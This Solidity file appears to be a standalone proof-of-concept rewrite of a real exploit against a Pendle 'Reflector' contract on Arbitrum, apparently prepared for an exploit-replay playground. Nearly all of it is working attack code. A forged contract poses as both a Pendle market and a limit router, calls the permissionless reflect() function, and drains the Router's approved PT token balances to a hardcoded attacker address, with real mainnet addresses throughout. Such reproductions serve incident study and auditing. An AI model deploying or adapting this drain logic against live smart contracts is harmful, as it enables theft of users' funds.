// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

// @KeyInfo - Total Lost : 2304.18 USD
// Attacker : 0x6c1d0f1EF9ac1C989cCA02955d0e2b23d134e03A
// Attack Contract : 0xb630D5Ba520Ca38E9137900BDFe2eD8900665D0D
// Vulnerable Contract : 0x5039Da22E5126e7c4e9284376116716A91782faF
// Attack Tx : https://arbiscan.io/tx/0xf6c6a639d644122803ecc655f6debdc5f2333516eedb9d5991088d170e2e36fb
//
// Attack summary: reflect() re-scales caller-supplied Pendle swap calldata to Reflector's OWN
// token balance and forwards it to the real Pendle Router with a caller-chosen market and
// limit-router address. A single forged contract impersonates both roles: its readTokens()
// points the "SY" token at whichever PT Reflector holds, and its fill() (invoked BY the real
// Router as the "limit router") pulls the Router's freshly-approved PT balance straight to
// the attacker.
// Root cause: Reflector.reflect(bytes) is permissionless and trusts caller-supplied Pendle
// market and limit-router addresses while operating on Reflector-held token balances.
//
// This is a standalone rewrite of the original Foundry PoC (test/PendleReflector_exp.sol):
// the original inherits BaseTestWithBalanceLog -> forge-std Test and drives setUp() via
// vm.createSelectFork/vm.label, which the in-browser recorder cannot execute (no real forge
// cheatcode VM). The attack logic itself (forged market + limit router, _reflectAndDrain,
// calldata shape) is preserved exactly; only the Foundry test scaffolding is removed.

address constant ATTACKER = 0x6c1d0f1EF9ac1C989cCA02955d0e2b23d134e03A;
address constant REFLECTOR = 0x5039Da22E5126e7c4e9284376116716A91782faF;
address constant PENDLE_ROUTER = 0x888888888889758F76e7103c6CbF23ABbF58F946;
address constant PT_MPENDLE = 0x4a94091CAdD74BDf313B74d58EAc908C5fC53704;
address constant PT_STK_EPENDLE = 0x2A18A490EC18b019837f6153269d21A772167292;

struct ApproxParams {
    uint256 guessMin;
    uint256 guessMax;
    uint256 guessOffchain;
    uint256 maxIteration;
    uint256 eps;
}

struct Order {
    uint256 salt;
    uint256 expiry;
    uint256 nonce;
    uint8 orderType;
    address token;
    address YT;
    address maker;
    address receiver;
    uint256 makingAmount;
    uint256 lnImpliedRate;
    uint256 failSafeRate;
    bytes permit;
}

struct FillOrderParams {
    Order order;
    bytes signature;
    uint256 makingAmount;
}

struct LimitOrderData {
    address limitRouter;
    uint256 epsSkipMarket;
    FillOrderParams[] normalFills;
    FillOrderParams[] flashFills;
    bytes optData;
}

interface IERC20Min {
    function balanceOf(
        address account
    ) external view returns (uint256);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IPendleReflector {
    function reflect(
        bytes calldata inputData
    ) external returns (bytes memory result);
}

interface IPendleActionSwapYTV3 {
    function swapExactSyForYt(
        address receiver,
        address market,
        uint256 exactSyIn,
        uint256 minYtOut,
        ApproxParams calldata guessYtOut,
        LimitOrderData calldata limit
    ) external returns (uint256 netYtOut, uint256 netSyFee);
}

interface IPendleLimitRouter {
    function fill(
        FillOrderParams[] calldata params,
        address receiver,
        uint256 maxTaking,
        bytes calldata optData,
        bytes calldata callback
    ) external returns (uint256 actualMaking, uint256 actualTaking, uint256 totalFee, bytes memory ret);
}

// This single contract plays BOTH forged roles the real attacker's contract played
// (Pendle market + Pendle limit router) by pointing `market` and `limit.limitRouter`
// at itself - Reflector calls readTokens() on it, and the real Router later calls
// fill() on it. Merging both roles into the recorded exploit contract (rather than a
// separately-deployed helper) keeps every executed opcode inside the ONE contract the
// playground compiles a source map for.
contract PendleReflector is IPendleLimitRouter {
    // Which PT token the forged market/limit-router currently impersonates.
    address private token;

    // Recorded entrypoint: drains Reflector's full balance of both PT tokens by
    // reusing this same contract as the forged market/limit-router for each token.
    function attack() external {
        _reflectAndDrain(PT_MPENDLE);
        _reflectAndDrain(PT_STK_EPENDLE);
    }

    function _reflectAndDrain(
        address token_
    ) internal {
        token = token_;
        // Reflector ignores this value and re-derives netSyIn from its own
        // balance inside _scaleSyInput(); any value produces valid calldata.
        uint256 exactSyIn = IERC20Min(token_).balanceOf(REFLECTOR);
        IPendleReflector(REFLECTOR).reflect(_buildReflectorInput(exactSyIn));
    }

    function _buildReflectorInput(
        uint256 exactSyIn
    ) internal view returns (bytes memory) {
        ApproxParams memory guess = ApproxParams({guessMin: 0, guessMax: 0, guessOffchain: 0, maxIteration: 32, eps: 0});
        LimitOrderData memory limit = _fakeLimitOrderData();

        return abi.encodeCall(
            IPendleActionSwapYTV3.swapExactSyForYt, (address(this), address(this), exactSyIn, 0, guess, limit)
        );
    }

    function _fakeLimitOrderData() internal view returns (LimitOrderData memory limit) {
        limit.limitRouter = address(this);
        limit.epsSkipMarket = 3;
        limit.normalFills = new FillOrderParams[](1);
        limit.flashFills = new FillOrderParams[](0);
        limit.optData = "";
    }

    // Impersonates the Pendle MARKET interface: Reflector's _scaleSyInput() calls
    // readTokens() and treats the returned SY as the token whose balance to
    // scale the swap to - we point it at whichever PT token Reflector holds.
    function readTokens() external view returns (address SY, address PT, address YT) {
        return (token, token, token);
    }

    // Impersonates the Pendle LIMIT ROUTER interface: invoked BY the real Pendle
    // Router during the swap. Pulls the Router's freshly Reflector-funded PT
    // balance straight to the attacker.
    function fill(
        FillOrderParams[] calldata,
        address,
        uint256 maxTaking,
        bytes calldata,
        bytes calldata
    ) external returns (uint256 actualMaking, uint256 actualTaking, uint256 totalFee, bytes memory ret) {
        uint256 routerBalance = IERC20Min(token).balanceOf(PENDLE_ROUTER);
        IERC20Min(token).transferFrom(PENDLE_ROUTER, ATTACKER, routerBalance);
        return (0, maxTaking, 0, "");
    }
}
